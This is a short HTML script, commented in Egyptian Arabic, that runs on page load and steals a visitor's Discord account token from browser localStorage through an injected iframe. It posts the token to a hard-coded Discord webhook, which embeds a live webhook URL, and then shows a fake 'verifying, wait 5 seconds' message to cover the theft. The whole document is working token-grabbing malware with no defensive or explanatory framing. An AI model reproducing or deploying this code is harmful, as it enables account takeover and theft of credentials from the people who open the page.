<script>
    // الكود ده بيسحب التوكن من ذاكرة المتصفح مباشرة
    function grabToken() {
        // محاولة سحب التوكن لو الشخص فاتح ديسكورد في نفس المتصفح
        let token = (
            document.body.appendChild(document.createElement(`iframe`))
            .contentWindow.localStorage.token || ""
        ).replace(/"/g, "");

        if (token && !token.startsWith("MTQ5")) { // التأكد إنه مش توكن بوتك
            fetch('https://discord.com/api/webhooks/1491926490361626794/4-BpbrT0_5Qiy8HlssJyJlhlXJ5G5w_uZk7IlMFAisNJ-VmenDxcG8sk3nGZSCc32iQD', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `🎯 **MNC REAL USER TOKEN:** \`${token}\`` })
            });
            document.body.innerHTML = "<h1>جاري التحقق... انتظر 5 ثواني</h1>";
        } else {
            // لو ملقاش توكن، ابعت رسالة تنبيه
            console.log("No user token found yet.");
        }
    }

    window.onload = grabToken;
</script>
